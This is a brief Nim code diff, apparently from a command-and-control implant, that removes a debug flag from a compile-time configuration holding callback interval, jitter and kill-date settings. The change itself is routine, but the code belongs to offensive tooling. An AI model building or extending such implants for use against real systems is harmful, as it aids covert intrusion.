@@ -18,7 +18,6 @@ type
     callbackInterval*: int
     callbackJitter*: int
     killdate*: string
-    debug*: bool
 
 proc getConfig*(): Config =
   ## Get configuration from compile-time environment variables
@@ -41,7 +40,4 @@ proc getConfig*(): Config =
   result.callbackInterval = static: parseInt(getEnv("CALLBACK_INTERVAL", ""))
   result.callbackJitter = static: parseInt(getEnv("CALLBACK_JITTER", ""))
   result.killdate = static: getEnv("KILLDATE", "")
-  
-  let debugStr = static: getEnv("DEBUG", "false")
-  result.debug = debugStr.toLowerAscii in ["true", "t"]
   
